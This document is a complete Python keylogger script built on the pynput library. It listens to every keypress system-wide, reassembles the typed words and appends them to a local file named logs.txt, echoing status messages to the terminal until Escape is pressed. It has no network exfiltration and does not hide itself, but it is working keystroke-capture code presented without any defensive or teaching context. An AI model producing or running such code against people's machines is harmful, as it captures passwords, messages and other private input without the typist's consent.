from pynput import keyboard
import os
from datetime import datetime

LOG_FILE = "logs.txt"
current_word = []
word_count = 0

def log_status(message):
    """Print status messages to the terminal with a timestamp."""
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    print(f"{timestamp} {message}")

def write_word(newline=False):
    """Write the current word to the log file."""
    global current_word, word_count
    if current_word:
        word = ''.join(current_word)
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(word)
            if newline:
                f.write("\n")  # Start next word on a new line
            else:
                f.write(" ")   # Space between words
        word_count += 1
        log_status(f"Word logged: '{word}'")
        current_word.clear()
    elif newline:
        # If Enter is pressed without a word, just write a newline
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write("\n")
        log_status("[Newline inserted]")

def on_press(key):
    """Capture each key press and handle it accordingly."""
    try:
        if hasattr(key, 'char') and key.char is not None:
            current_word.append(key.char)
        elif key == keyboard.Key.space:
            write_word()
        elif key == keyboard.Key.enter:
            write_word(newline=True)
        elif key == keyboard.Key.tab:
            write_word()
        elif key == keyboard.Key.backspace:
            if current_word:
                current_word.pop()
        elif key in [
            keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
            keyboard.Key.alt_l, keyboard.Key.alt_r,
            keyboard.Key.shift, keyboard.Key.shift_l,
            keyboard.Key.shift_r, keyboard.Key.caps_lock,
            keyboard.Key.cmd
        ]:
            # Ignore logging special keys, but show them in the terminal
            log_status(f"[{key.name} pressed]")
        elif key == keyboard.Key.esc:
            log_status("Escape pressed. Exiting monitor.")
            return False
    except Exception as e:
        log_status(f"[Error] {e}")

def main():
    log_status("📋 Keylogger started. Logging to: " + os.path.abspath(LOG_FILE))
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    log_status(f"📊 Monitoring stopped. Total words captured: {word_count}")

if __name__ == "__main__":
    main()
